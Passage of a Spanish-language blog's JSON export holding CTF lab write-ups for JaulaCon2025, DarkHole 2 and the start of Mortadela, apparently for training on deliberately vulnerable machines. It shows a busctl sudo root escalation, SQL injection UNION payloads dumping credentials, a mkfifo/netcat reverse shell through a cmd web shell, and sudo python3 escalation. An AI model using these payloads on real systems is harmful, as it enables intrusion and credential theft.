#1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Jul 19 18:13:44 2025 from 192.168.44.128 JaulaCon2025@JaulaCon2025:~$\rShell as root Vamos a ver si tenemos alg√∫n permiso SUDOERS en la m√°quina, para ello haremos un sudo -l:\nJaulaCon2025@JaulaCon2025:~$ sudo -l sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido Matching Defaults entries for JaulaCon2025 on JaulaCon2025: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User JaulaCon2025 may run the following commands on JaulaCon2025: (root) NOPASSWD: /usr/bin/busctl\rSi buscamos este binario en GTFObins nos comenta lo siguiente para abusar de el:\nsudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/bash,argv1=-c,argv2=\u0026#39;/bin/bash -i 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39;\rVamos a explotarlo:\nJaulaCon2025@JaulaCon2025:~$ sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/bash,argv1=-c,argv2=\u0026#39;/bin/bash -i 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido root@JaulaCon2025:/home/JaulaCon2025# whoami root\rroot! ;)\n","date":"2025-07-19","id":11,"permalink":"/writeups/thehackerslabs/jaulacon2025/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/JaulaCon2025/nmap] ‚îî‚îÄ$ nmap -p- --open -sS -n -Pn -vvv --min-rate=5000 192.168.44.131 Starting Nmap 7.","tags":[],"title":"JaulaCon2025"},{"content":"Enumeration Vamos a empezar escaneando la red local:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/Vulnhub/DarkHole2/nmap] ‚îî‚îÄ$ sudo arp-scan -I eth0 --localnet [sudo] password for pylon: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9e:99:b0, IPv4: 192.168.64.128 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.64.1 00:50:56:c0:00:08 VMware, Inc. 192.168.64.2 00:50:56:fb:55:46 VMware, Inc. 192.168.64.129 00:0c:29:95:1b:eb VMware, Inc. 192.168.64.254 00:50:56:ed:c4:96 VMware, Inc. 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 1.922 seconds (133.19 hosts/sec). 4 responded\rPor la direci√≥n MAC identifico la IP de la m√°quina que es la 192.168.64.129. Ahora vamos a realizar un escaneo de puertos con nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/Vulnhub/DarkHole2/nmap] ‚îî‚îÄ$ nmap -p- --open -sS -n -Pn -vvv 192.168.64.129 -oG ports Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 13:18 CEST Initiating ARP Ping Scan at 13:18 Scanning 192.168.64.129 [1 port] Completed ARP Ping Scan at 13:18, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:18 Scanning 192.168.64.129 [65535 ports] Discovered open port 80/tcp on 192.168.64.129 Discovered open port 22/tcp on 192.168.64.129 Completed SYN Stealth Scan at 13:18, 0.97s elapsed (65535 total ports) Nmap scan report for 192.168.64.129 Host is up, received arp-response (0.00060s latency). Scanned at 2025-07-01 13:18:21 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:95:1B:EB (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos que tiene el puerto 22 y 80 abierto, vamos a realizar un segundo escaneo para identificar que servicios y versiones est√°n corriendo:\n# Nmap 7.95 scan initiated Tue Jul 1 13:19:34 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN target 192.168.64.129 Nmap scan report for 192.168.64.129 Host is up (0.00015s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA) | 256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA) |_ 256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-git: | 192.168.64.129:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... |_ Last commit message: i changed login.php file for more secure |_http-title: DarkHole V2 MAC Address: 00:0C:29:95:1B:EB (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 1 13:19:40 2025 -- 1 IP address (1 host up) scanned in 6.53 seconds\rVemos lo siguiente:\nPuerto Informaci√≥n 22/tcp OpenSSH 8.2p1 Ubuntu 80/tcp Apache httpd 2.4.41 / Nos reporta que a encontrado el directorio .git . Al ver que esta expuesto la carpeta .git decido dumpearla con git-dumper :\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/Vulnhub/DarkHole2/content] ‚îî‚îÄ$ git-dumper http://192.168.64.129/.git/ git [-] Testing http://192.168.64.129/.git/HEAD [200] [-] Testing http://192.168.64.129/.git/ [200] [-] Fetching .git recursively [-] Fetching http://192.168.64.129/.git/ [200] [-] Fetching http://192.168.64.129/.gitignore [404] [-] Fetching http://192.168.64.129/.git/COMMIT_EDITMSG [200] [-] Fetching http://192.168.64.129/.git/HEAD [200] [-] Fetching http://192.168.64.129/.git/config [200] [-] Fetching http://192.168.64.129/.git/info/ [200] [-] Fetching http://192.168.64.129/.git/hooks/ [200] [-] Fetching http://192.168.64.129/.git/logs/ [200] [-] Fetching http://192.168.64.129/.git/info/exclude [200] [-] Fetching http://192.168.64.129/.git/description [200] [-] Fetching http://192.168.64.129/.git/logs/refs/ [200] [-] Fetching http://192.168.64.129/.git/objects/ [200] [-] Fetching http://192.168.64.129/.git/index [200] [-] Fetching http://192.168.64.129/.git/refs/ [200] [-] Fetching http://192.168.64.129/.git/hooks/commit-msg.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/post-update.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/fsmonitor-watchman.sample [200] [-] Fetching http://192.168.64.129/.git/logs/HEAD [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-merge-commit.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-push.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-commit.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-rebase.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/prepare-commit-msg.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/push-to-checkout.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-receive.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/applypatch-msg.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/update.sample [200] [-] Fetching http://192.168.64.129/.git/hooks/pre-applypatch.sample [200] [-] Fetching http://192.168.64.129/.git/logs/refs/heads/ [200] [-] Fetching http://192.168.64.129/.git/objects/04/ [200] [-] Fetching http://192.168.64.129/.git/refs/tags/ [200] [-] Fetching http://192.168.64.129/.git/objects/09/ [200] [-] Fetching http://192.168.64.129/.git/objects/4e/ [200] [-] Fetching http://192.168.64.129/.git/refs/heads/ [200] [-] Fetching http://192.168.64.129/.git/objects/8b/ [200] [-] Fetching http://192.168.64.129/.git/objects/9d/ [200] [-] Fetching http://192.168.64.129/.git/objects/32/ [200] [-] Fetching http://192.168.64.129/.git/objects/8a/ [200] [-] Fetching http://192.168.64.129/.git/objects/6e/ [200] [-] Fetching http://192.168.64.129/.git/objects/0f/ [200] [-] Fetching http://192.168.64.129/.git/objects/7f/ [200] [-] Fetching http://192.168.64.129/.git/objects/66/ [200] [-] Fetching http://192.168.64.129/.git/objects/49/ [200] [-] Fetching http://192.168.64.129/.git/objects/a2/ [200] [-] Fetching http://192.168.64.129/.git/objects/93/ [200] [-] Fetching http://192.168.64.129/.git/objects/59/ [200] [-] Fetching http://192.168.64.129/.git/objects/77/ [200] [-] Fetching http://192.168.64.129/.git/objects/b2/ [200] [-] Fetching http://192.168.64.129/.git/objects/b6/ [200] [-] Fetching http://192.168.64.129/.git/objects/56/ [200] [-] Fetching http://192.168.64.129/.git/objects/e6/ [200] [-] Fetching http://192.168.64.129/.git/objects/a4/ [200] [-] Fetching http://192.168.64.129/.git/objects/pack/ [200] [-] Fetching http://192.168.64.129/.git/objects/aa/ [200] [-] Fetching http://192.168.64.129/.git/objects/ca/ [200] [-] Fetching http://192.168.64.129/.git/objects/c1/ [200] [-] Fetching http://192.168.64.129/.git/objects/c9/ [200] [-] Fetching http://192.168.64.129/.git/objects/info/ [200] [-] Fetching http://192.168.64.129/.git/objects/8b/6cd9032d268332de09c64cbe9efa63ace3998e [200] [-] Fetching http://192.168.64.129/.git/refs/heads/master [200] [-] Fetching http://192.168.64.129/.git/objects/04/4d8b4fec000778de9fb27726de4f0f56edbd0e [200] [-] Fetching http://192.168.64.129/.git/objects/4e/b24de5b85be7cf4b2cef3f0cfc83b09a236133 [200] [-] Fetching http://192.168.64.129/.git/objects/6e/4328f5f878ed20c0b68fc8bda2133deadc49a3 [200] [-] Fetching http://192.168.64.129/.git/objects/32/580f7fb8c39cdad6a7f49839cebfe07f597bcf [200] [-] Fetching http://192.168.64.129/.git/objects/32/d0928f948af8252b0200ff9cac40534bfe230b [200] [-] Fetching http://192.168.64.129/.git/logs/refs/heads/master [200] [-] Fetching http://192.168.64.129/.git/objects/8a/0ff67b07eb0cc9b7bed4f9094862c22cab2a7d [200] [-] Fetching http://192.168.64.129/.git/objects/7f/d95a2f170cb55fbb335a56974689f659e2c383 [200] [-] Fetching http://192.168.64.129/.git/objects/09/04b1923584a0fb0ab31632de47c520db6a6e21 [200] [-] Fetching http://192.168.64.129/.git/objects/66/5001d05a7c0b6428ce22de1ae572c54cba521d [200] [-] Fetching http://192.168.64.129/.git/objects/a2/0488521df2b427246c0155570f5bfad6936c6c [200] [-] Fetching http://192.168.64.129/.git/objects/77/c09cf4b905b2c537f0a02bca81c6fbf32b9c9d [200] [-] Fetching http://192.168.64.129/.git/objects/49/151b46cc957717f5529d362115339d4abfe207 [200] [-] Fetching http://192.168.64.129/.git/objects/9d/ed9bf70f1f63a852e9e4f02df7b6d325e95c67 [200] [-] Fetching http://192.168.64.129/.git/objects/93/9b9aad671e5bcde51b4b5d99b1464e2d52ceaa [200] [-] Fetching http://192.168.64.129/.git/objects/56/987e1f75e392aae416571b38b53922c49f6e7e [200] [-] Fetching http://192.168.64.129/.git/objects/59/218997bfb0d8012a918e43bea3e497e68248a9 [200] [-] Fetching http://192.168.64.129/.git/objects/b6/f546da0ab9a91467412383909c8edc9859a363 [200] [-] Fetching http://192.168.64.129/.git/objects/b2/076545503531a2e482a89b84f387e5d44d35c0 [200] [-] Fetching http://192.168.64.129/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200] [-] Fetching http://192.168.64.129/.git/objects/ca/f37015411ad104985c7dd86373b3a347f71097 [200] [-] Fetching http://192.168.64.129/.git/objects/a4/d900a8d85e8938d3601f3cef113ee293028e10 [200] [-] Fetching http://192.168.64.129/.git/objects/0f/1d821f48a9cf662f285457a5ce9af6b9feb2c4 [200] [-] Fetching http://192.168.64.129/.git/objects/c9/56989b29ad0767edc6cf3a202545927c3d1e76 [200] [-] Fetching http://192.168.64.129/.git/objects/c1/ef127486aa47cd0b3435bca246594a43b559bb [200] [-] Fetching http://192.168.64.129/.git/objects/aa/2a5f3aa15bb402f2b90a07d86af57436d64917 [200] [-] Sanitizing .git/config [-] Running git checkout .\rBien ya teniendo esta informaci√≥n, antes de seguir con ella vamos a buscar otra, vamos a ver la aplicaci√≥n web:\nPodemos ver que tiene un Login , vamos a intentar credenciales b√°sicas:\nSe ve que pide de un correo electronico, vamos a probar en el campo de la contrase√±a a√±adir una ' a ver si sucede algo fuera de lo normal:\nSigue exactamente igual‚Ä¶ En la web no hay gran cosa, as√≠ que vamos a ver el git:\nVamos a ver el login.php para ver si hay algo mal configurado y que podamos abusar de el:\n\u0026lt;?php session_start(); require \u0026#39;config/config.php\u0026#39;; if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;){ $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;email\u0026#39;])); $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;password\u0026#39;])); $check = $connect-\u0026gt;query(\u0026#34;select * from users where email=\u0026#39;$email\u0026#39; and password=\u0026#39;$pass\u0026#39; and id=1\u0026#34;); if($check-\u0026gt;num_rows){ $_SESSION[\u0026#39;userid\u0026#39;] = 1; header(\u0026#34;location:dashboard.php\u0026#34;); die(); } } ?\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style/login.css\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script src=\u0026#34;https://kit.fontawesome.com/fe909495a1.js\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;Project_1.css\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Home\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;üëã Welcome\u0026lt;/h1\u0026gt; \u0026lt;!-- \u0026lt;a href=\u0026#34;file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/Project_1.html\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Sign In\u0026lt;/h1\u0026gt;\u0026lt;/a\u0026gt; --\u0026gt; \u0026lt;!-- \u0026lt;a href=\u0026#34;file:///C:/Users/SAURABH%20SINGH/Desktop/HTML5/PROJECTS/Project%201/P2.html\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Log In\u0026lt;/h1\u0026gt;\u0026lt;/a\u0026gt; --\u0026gt; \u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-envelope\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;input type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34; id=\u0026#34;email\u0026#34; placeholder=\u0026#34;Enter Your Email\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;box\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-key\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; placeholder=\u0026#34;Enter Your Password\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026#34;btn\u0026#34; name=\u0026#34;button\u0026#34;\u0026gt;Login\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; Viendo las primeras lineas del c√≥digo veo que incluye el archivo config.php que se encuentra en el directorio config. Vamos a darle un ojo:\n\u0026lt;?php $connect = new mysqli(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;\u0026#34;,\u0026#34;darkhole_2\u0026#34;); [..]\rTenemos unas credenciales:\nUsername Password root darkhole_2 En este caso son las credenciales de acceso a la base de datos, esto nos est√° chivando que el usuario empleado es root con una posibilidad de tener super privilegios en la base de datos y poder realizar muchas acciones abusando de los privilegios. Pero primero necesitamos encontrar un SQLi . En el c√≥digo vemos lo que hace con nuestro input:\n[..] $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;email\u0026#39;])); $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u0026#39;password\u0026#39;])); [..]\rVemos que nos sanitiza la entrada con mysqli_real_escape_string as√≠ que por aqu√≠ no puede a ver un SQLi. Vamos a ver los logs del .git:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/Vulnhub/DarkHole2/content/git] ‚îî‚îÄ$ git log commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -\u0026gt; master) Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:14:32 2021 +0300 i changed login.php file for more secure commit a4d900a8d85e8938d3601f3cef113ee293028e10 Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:06:20 2021 +0300 I added login.php file with default credentials commit aa2a5f3aa15bb402f2b90a07d86af57436d64917 Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:02:44 2021 +0300 First Initialize\rShell as jehad Vemos varios logs, donde en 1 vemos un correo electr√≥nico ‚Üí anmar-v7@hotmail.com. Vamos a ver que se realiz√≥ en ese log ya que comenta que a√±adio cosas en el login.php:\n‚îå‚îÄ‚îÄ(venv)‚îÄ(pylon„âøkali)-[~/‚Ä¶/Vulnhub/DarkHole2/content/git] 13:31:42 [2/2] ‚îî‚îÄ$ git show a4d900a8d85e8938d3601f3cef113ee293028e10 commit a4d900a8d85e8938d3601f3cef113ee293028e10 Author: Jehad Alqurashi \u0026lt;anmar-v7@hotmail.com\u0026gt; Date: Mon Aug 30 13:06:20 2021 +0300 I added login.php file with default credentials diff --git a/login.php b/login.php index e69de29..8a0ff67 100644 --- a/login.php +++ b/login.php @@ -0,0 +1,42 @@ +\u0026lt;?php +session_start(); +require \u0026#39;config/config.php\u0026#39;; +if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;){ + if($_POST[\u0026#39;email\u0026#39;] == \u0026#34;lush@admin.com\u0026#34; \u0026amp;\u0026amp; $_POST[\u0026#39;password\u0026#39;] == \u0026#34;321\u0026#34;){ + $_SESSION[\u0026#39;userid\u0026#39;] = 1; + header(\u0026#34;location:dashboard.php\u0026#34;); + die(); + } + +} +?\u0026gt; + +\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style/login.css\u0026#34;\u0026gt; +\u0026lt;head\u0026gt; + \u0026lt;script src=\u0026#34;https://kit.fontawesome.com/fe909495a1.js\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; + \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;Project_1.css\u0026#34;\u0026gt; + \u0026lt;title\u0026gt;Home\u0026lt;/title\u0026gt;\rVemos otras credenciales:\nUsername Password root darkhole_2 lush@admin.com 321 Vemos que esto estaba en el login.php, vamos a ver si son v√°lidas:\nBien!! Me estoy finjando en un detalle que es el par√°metro por GET id , vamos a probar a poner una comilla simple:\nVemos que la aplicaci√≥n no carga. vamos a ver que c√≥digo de estado devuelve:\nVamos a emplear ORDER BY para filtrar por un n√∫mero de columnas hasta encontrar el exacto:\n' order by 100-- -: Era poco probable, vamos a bajarlo a 10:\nNada‚Ä¶ vamos a ir probando 9,8,7‚Ä¶ hasta que de otro c√≥digo de estado:\nVemos que con 6 funciona, para probar vamos a poner 7:\nVale, ya conocemos el n√∫mero exacto de columnas que tiene la tabla. Vamos a emplear UNION para ver si se reflejan los ‚Äúdatos basura\u0026quot;:\n\u0026#39; union select 1,2,3,4,5,6-- -\rVemos que no‚Ä¶ Ya que hay datos existentes y se reflejan primero. Vamos a probar a ir a id=2:\nVemos que aqu√≠ ya no hay datos, vamos a probar el UNION:\nVemos que se relfjan las columnas 2,3,5,6 y las columnas 1,4 no. Trabajaremos en la columna 2 ya que se refleja. Vamos a confirmar que el usuario que esta conectado a la db es root con la funci√≥n user():\n\u0026#39; union select 1,user(),3,4,5,6-- -\rVamos a ver si tenemos super privilegios en la base de datos, para ello usaremos la base de datos mysql y la tabla user apuntando a la columna super_priv:\n\u0026#39; union select 1,super_priv,3,4,5,6 from mysql.user-- -\rEn este caso nos dice que Y que significa Yes as√≠ que tenemos super privilegios en la base de datos. Vamos a intentar enumerar los privilegios que tenemos:\n\u0026#39; union select 1,grantee,privilege_type,4,5,6 from information_schema.user_privileges-- -\rPodemos fijarnos en 2 problemas:\nNo vemos todos los resultados solo muestra la primera fila. Estamos viendo los privilegios de otro usuario al que no estamos interesados Para ver todos los resultados vamos a usar group_concat() que lo que hace es concatenar todas las filas en 1:\n\u0026#39; union select 1,group_concat(grantee),3,4,group_concat(privilege_type),6 from information_schema.user_privileges where grantee=\u0026#34;\u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39;\u0026#34;-- -\rPero no nos mostrar√° nada. Vamos a enumerar la base de datos:\n\u0026#39; union select 1,schema_name,3,4,5,6 from information_schema.schemata-- -\rVemos solo mysql y es raro, vamos a usar group_concat:\n\u0026#39; union select 1,group_concat(schema_name),3,4,5,6 from information_schema.schemata-- -\rVemos la base de datos darkhole_2, vamos a ver que db esta empleando actualmente:\n\u0026#39; union select 1,database(),3,4,5,6-- -\rVale, vamos a enumerar que tablas tiene la base de datos darkhole_2:\n\u0026#39; union select 1,group_concat(table_name),3,4,group_concat(table_schema),6 from information_schema.tables where table_schema=\u0026#39;darkhole_2\u0026#39;-- -\rExisten 2 tablas:\nusers ssh Vamos a ver la tabla users a ver que columnas contiene: \u0026#39; union select 1,group_concat(column_name),3,4,group_concat(table_name),group_concat(table_schema) from information_schema.columns where table_name=\u0026#39;users\u0026#39; and table_schema=\u0026#39;darkhole_2\u0026#39;-- -\rVemos las siguientes columnas:\naddress contact_number email id password username \u0026#39; union select 1,username,3,4,password,6 from darkhole_2.users-- -\rVemos ya las credenciales obtenidas anteriormente por los logs de git. Vamos a ver las columnas de la otra tabla llamada ssh:\n\u0026#39; union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=\u0026#39;ssh\u0026#39; and table_schema=\u0026#39;darkhole_2\u0026#39;-- -\rVamos a ver el contenido de esas columnas:\n\u0026#39; union select 1,group_concat(user),3,4,group_concat(pass),6 from darkhole_2.ssh-- -\rTenemos la siguientes credenciales:\nUsername Password Servicio root darkhole_2 mysql lush@admin.com 321 login (http) jehad fool ssh Vamos a probar las credenciales por SSH:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/Vulnhub/DarkHole2/nmap/git] ‚îî‚îÄ$ ssh jehad@192.168.64.129 jehad@192.168.64.129\u0026#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 01 Jul 2025 06:13:39 PM UTC System load: 0.01 Processes: 233 Usage of /: 49.9% of 12.73GB Users logged in: 0 Memory usage: 20% IPv4 address for ens33: 192.168.64.129 Swap usage: 0% * Super-optimized for small spaces - read how we shrank the memory footprint of MicroK8s to make it the smallest full K8s around. https://ubuntu.com/blog/microk8s-memory-optimisation 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Fri Sep 3 05:49:05 2021 from 192.168.135.128 jehad@darkhole:~$\rShell as losy Vamos a ver el .bash_history de nuestro usuario actual jehad:\njehad@darkhole:~$ cat .bash_history [..] curl http://localhost:9999 curl \u0026#34;http://localhost:999/?cmd=id\u0026#34; curl \u0026#34;http://localhost:9999/?cmd=id\u0026#34; curl http://localhost:9999/ [..]\rVemos que ha realizado peticiones por GET al puerto 9999 que estar√≠a corriendo en localhost, vamos a comprobar si sigue activo:\njehad@darkhole:~$ ss -anot State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 151 127.0.0.1:3306 0.0.0.0:* LISTEN 0 4096 127.0.0.1:9999 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 70 127.0.0.1:33060 0.0.0.0:* ESTAB 0 0 192.168.64.129:22 192.168.64.128:48028 timer:(keepalive,117min,0) LISTEN 0 511 *:80 *:* LISTEN 0 128 [::]:22 [::]:*\rSigue activo, vamos a enviarle un petici√≥n con curl:\njehad@darkhole:~$ curl localhost:9999 Parameter GET[\u0026#39;cmd\u0026#39;]\rVemos que espera un par√°metro por GET llamado cmd, vamos a enviarselo con un valor de un comando del sistema como id, ya que normalmente el par√°metro cmd se emplea para ejecutar comandos a nivel de sistema:\njehad@darkhole:~$ curl localhost:9999?cmd=id Parameter GET[\u0026#39;cmd\u0026#39;]uid=1002(losy) gid=1002(losy) groups=1002(losy) uid=1002(losy) gid=1002(losy) groups=1002(losy)\rVemos que lo ejecuta como el usuario losy, vamos a ponernos en escucha en otra shell por ssh ya que esto corre por su localhost y no llegar√° a nuestra m√°quina, vamos a ver si tiene nc:\njehad@darkhole:~$ nc usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length] [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [destination] [port]\rBien nos pondremos en escucha en el puerto 8081:\njehad@darkhole:~$ nc -nlvp 8081 Listening on 0.0.0.0 8081\rAhora enviaremos la reverse shell sacada de Online - Reverse Shell Generator:\njehad@darkhole:~$ curl \u0026#34;http://127.0.0.1:9999/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20127.0.0.1%208081%20%3E%2Ftmp%2Ff\u0026#34;\rAhora veremos si se estableci√≥ conexi√≥n:\njehad@darkhole:~$ nc -nlvp 8081 Listening on 0.0.0.0 8081 Connection received on 127.0.0.1 34774 sh: 0: can\u0026#39;t access tty; job control turned off $\rBien! Pongamos whoami para ver si somos losy:\n$ whoami losy\rVemos que estamos en el directorio /opt/web donde vemos un index.php:\nlosy@darkhole:/opt/web$ cat index.php \u0026lt;?php echo \u0026#34;Parameter GET[\u0026#39;cmd\u0026#39;]\u0026#34;; if(isset($_GET[\u0026#39;cmd\u0026#39;])){ echo system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt;\rAh√≠ vemos que recoje el valor del par√°metro por GET y ejecuta como comando del sistema con system.\nShell as root Vamos a ver el .bash_history del usuario losy:\nUsername Password Servicio root darkhole_2 mysql lush@admin.com 321 login (http) jehad fool ssh losy gang Ahora vamos a hacer un sudo -l:\nlosy@darkhole:~$ sudo -l [sudo] password for losy: Matching Defaults entries for losy on darkhole: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User losy may run the following commands on darkhole: (root) /usr/bin/python3\rLo que haremos es ejecutar python3 como root e importar la libreria os:\nlosy@darkhole:~$ sudo python3 -c \u0026#34;import os; os.system(\u0026#39;id\u0026#39;)\u0026#34; uid=0(root) gid=0(root) groups=0(root)\rlosy@darkhole:~$ sudo python3 -c \u0026#34;import os; os.system(\u0026#39;/bin/bash\u0026#39;)\u0026#34; root@darkhole:/home/losy# whoami root\rroot! ;)\n","date":"2025-07-18","id":12,"permalink":"/writeups/vulnhub/darkhole2/","summary":"Enumeration Vamos a empezar escaneando la red local:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/Vulnhub/DarkHole2/nmap] ‚îî‚îÄ$ sudo arp-scan -I eth0 --localnet [sudo] password for pylon: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9e:99:b0, IPv4: 192.","tags":[],"title":"DarkHole 2"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n‚îå‚îÄ‚îÄ(pylon„âøkali)-[~/‚Ä¶/pylon/THL/Mortadela/nmap] ‚îî‚îÄ$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.130 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 12:24 CEST Initiating ARP Ping Scan at 12:24 Scanning 192.168.231.130 [1 port] Completed ARP Ping Scan at 12:24, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:24 Scanning 192.168.231.130 [65535 ports] Discovered open port 22/tcp on 192.168.231.130 Discovered open port 3306/tcp on 192.168.231.130 Discovered open port 80/tcp on 192.168.231.130 Completed SYN Stealth Scan at 12:24, 0.87s elapsed (65535 total ports) Nmap scan report 